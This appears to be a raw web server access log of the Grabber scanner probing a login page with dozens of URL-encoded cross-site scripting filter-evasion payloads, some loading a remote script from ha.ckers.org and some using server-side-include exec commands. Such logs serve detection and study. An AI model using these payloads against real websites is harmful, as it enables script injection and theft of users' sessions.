172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.gohttp%3A%2F%2Fwww.google.com%2Fogle.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CXML+ID%3D%22xss%22%3E%3CI%3E%3CB%3E%3CIMG+SRC%3D%22javas%3C%21--+--%3Ecript%3Aalert%28%27XSS%27%29%22%3E%3C%2FB%3E%3C%2FI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%22%23xss%22+DATAFLD%3D%22B%22+DATAFORMATAS%3D%22HTML%22%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:46 +0000] "GET /?Login=%3CA+HREF%3D%22http%3A%2F%2Fwww.google.com.%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
